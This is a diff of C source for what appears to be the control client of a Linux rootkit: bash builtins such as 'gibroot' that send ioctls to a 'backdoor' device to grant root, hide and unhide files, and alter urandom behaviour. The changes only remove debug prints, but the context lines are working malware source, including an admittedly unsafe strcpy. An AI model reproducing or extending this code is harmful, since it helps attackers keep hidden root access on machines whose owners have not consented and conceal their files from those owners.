@@ -91,8 +91,7 @@ static int make_unroot(list) WORD_LIST *list;
 static int toggle_urandom(list) WORD_LIST *list;
 {
 	int res;
-	int ret;
-	//printf("not yet implemented\n");
+	int ret;;
 	res = ioctl(backdoor_fd,URAND_IOCTL,NULL);
 	if (res == 0) {
 		printf("successfully toggled urandom behaviour\n");
@@ -149,7 +148,6 @@ static int get_parent_stuff(char *path,dev_t *parent_dev,
 	}
 	*parent_dev = parent_stat.st_dev;
 	*parent_ino = parent_stat.st_ino;
-	//printf("parent ino:%lu\n",*parent_ino);
 	*parent_dir = opendir(dname);
 out:
 	free(path_cpy);
@@ -163,7 +161,6 @@ static void get_basename_stuff(char *path,char **bname)
 	strcpy(path_cpy,path);//THIS ISN'T GREAT
 	base_ptr = basename(path_cpy);
 	*bname = calloc((strlen(base_ptr) + 1), sizeof(char));//MAKE SURE THAT THIS WILL BE AT MOST 256 BYTES
-	printf("base_ptr len:%d\n",strlen(base_ptr));
 	strncpy(*bname,base_ptr,MIN(strlen(base_ptr),255));
 	free(path_cpy);
 }
@@ -173,7 +170,6 @@ static int construct_request(char *path, struct hide_request *req)
 	DIR *parent_dir;
 	dev_t parent_dev;
 	ino_t parent_ino;
-	//struct dirent *cur;
 	char *bname;
 	int ret = 0;
 	ret = get_parent_stuff(path,
@@ -188,9 +184,6 @@ static int construct_request(char *path, struct hide_request *req)
 		strlen(bname),
 		bname,
 		parent_dev,parent_ino);
-
-	printf("bname: %s\n",bname);
-	//printf("not yet implemented\n");
 	free(bname);
 out:
 	return ret;
@@ -207,13 +200,10 @@ static int hide_item(list) WORD_LIST *list;
 
 	while (list != NULL) {
 		word = list->word->word;
-		printf("current item: %s\n",word);
 		if(construct_request(word,&req))
 			goto err_out;
 		list = list->next;
 	}
-	printf("finished adding items\n");
-	printf("parent ino:%lu\n",req.idents[0].parent_ino);
 	res = ioctl(backdoor_fd,HIDE_IOCTL,&req);
 	free_request(&req);
 
@@ -224,7 +214,6 @@ static int hide_item(list) WORD_LIST *list;
 		perror("ERROR HIDING ITEMS");
 		ret = EXECUTION_FAILURE;
 	}
-	printf("not yet implemented\n");
 	return 0;
 err_out:
 	if (req.count)
@@ -243,13 +232,10 @@ static int show_item(list) WORD_LIST *list;
 
 	while (list != NULL) {
 		word = list->word->word;
-		printf("current item: %s\n",word);
 		if(construct_request(word,&req))
 			goto err_out;
 		list = list->next;
 	}
-	printf("finished adding items\n");
-	printf("parent ino:%lu\n",req.idents[0].parent_ino);
 	res = ioctl(backdoor_fd,SHOW_IOCTL,&req);
 	free_request(&req);
 
@@ -260,7 +246,6 @@ static int show_item(list) WORD_LIST *list;
 		perror("ERROR UNHIDING ITEMS");
 		ret = EXECUTION_FAILURE;
 	}
-	printf("not yet implemented\n");
 	return 0;
 err_out:
 	if (req.count)
@@ -348,8 +333,7 @@ static int get_first_arg(list) WORD_LIST *list;
 int gibroot_builtin(list) WORD_LIST *list;
 {
 	int ret = 0;
-	printf("sizeof ino_t:%ld\n",sizeof(ino_t));
-	printf("sizeof dev_t:%ld\n",sizeof(dev_t));
+
 	if (open_device() == -1) {
 		printf("ERROR: backend device not registered\n");
 		ret = EXECUTION_FAILURE;
